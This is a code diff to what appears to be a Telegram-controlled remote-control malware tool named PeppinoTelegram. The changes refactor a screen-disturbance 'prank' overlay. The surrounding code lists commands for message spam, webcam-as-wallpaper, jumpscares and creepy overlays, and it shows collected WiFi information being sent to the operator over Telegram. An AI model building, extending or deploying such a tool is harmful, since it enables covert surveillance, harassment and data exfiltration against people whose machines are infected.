@@ -494,7 +494,7 @@ class PeppinoTelegram:
             Command("messagespam", self.spam_windows, "Spam message boxes.", "pranks", "📨 Message Spam"),
             Command("camerawallpaper", self.setCameraAsWallpaper, "Webcam as wallpaper.", "pranks", "📷 Camera Wallpaper"),
             Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "pranks", "🎞️ Set Video Wallpaper"),
-            Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "pranks", "🖥️🌀 Video Signal Drowning Effect"),#TODO
+            Command("hdmi_drowning_effect", self.wrapper_for_disturbed_overlay, "Noise overlay effect.", "pranks", "🖥️🌀 Video Signal Drowning Effect"),
             Command("disturbed_overlay_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "pranks", "🌀📻 Video&Sound Disturbance"),#TODO
             Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "pranks", "👻 Red Text Overlay"),
             Command("set_jumpscare_volume", self.setJumpscareVolume, "Set jumpscare's volume.","pranks" , "Set Jumpscare Volume"),
@@ -2677,15 +2677,27 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print("Getting WiFi info")
         self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")
 
-    def wrapper_for_hdmi_overlay(self, timeout_seconds: int) -> None:
-        print(f"Starting HDMI overlay for {timeout_seconds} seconds")
-        Thread(target=self.overlay_opencv.run_disturbance_effect(timeout_seconds)).start()
+    def wrapper_for_disturbed_overlay(self, timeout_seconds: int, custom_label=None, custom_oncancel=None) -> None:
+        print(f"Starting VideoDisturbance overlay for {timeout_seconds} seconds")
+        if  custom_label is None:
+            custom_label = "Disturbance Overlay"
+        if custom_oncancel is None:
+            custom_oncancel = self.overlay_opencv.setstop
+        bar = self.new_loading_bar_timed_worker(label=custom_label,
+                                                duration=timeout_seconds,
+                                                target=self.overlay_opencv.run_disturbance_effect,
+                                                args=(timeout_seconds, ),
+                                                on_cancel=custom_oncancel)
+        bar.start()
 
     def disturbed_overlay_and_random_noise(self, duration: int) -> None:
         print(f"Starting disturbed overlay and noise for {duration} seconds")
         t2 = Thread(target=play_random_noise, args=(duration,))
         t2.start()
-        self.wrapper_for_hdmi_overlay(duration)
+        self.wrapper_for_disturbed_overlay(duration,
+                                      custom_label="Disturbance Overlay and noise",
+                                      custom_oncancel=lambda: (stopallsounds(), self.overlay_opencv.setstop()))
+                                      #TODO Noise still does not stop
         t2.join()
 
 """
